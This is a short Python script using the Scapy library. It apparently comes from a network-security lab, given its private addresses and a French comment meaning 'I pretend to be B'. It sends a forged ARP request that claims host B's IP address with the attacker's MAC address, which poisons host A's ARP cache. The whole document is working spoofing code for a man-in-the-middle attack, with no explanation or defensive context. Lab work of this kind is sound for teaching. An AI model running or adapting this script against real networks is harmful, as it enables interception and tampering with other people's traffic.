#!/usr/bin/python3
from scapy.all import *

IP_A = "172.18.237.220"
IP_B = "172.18.237.51"
MAC_M = "08:00:27:73:7e:9d"

arp = ARP(
    op=1,              # ARP Request
    psrc=IP_B,         # Je prétends être B
    pdst=IP_A,
    hwsrc=MAC_M
)

send(arp)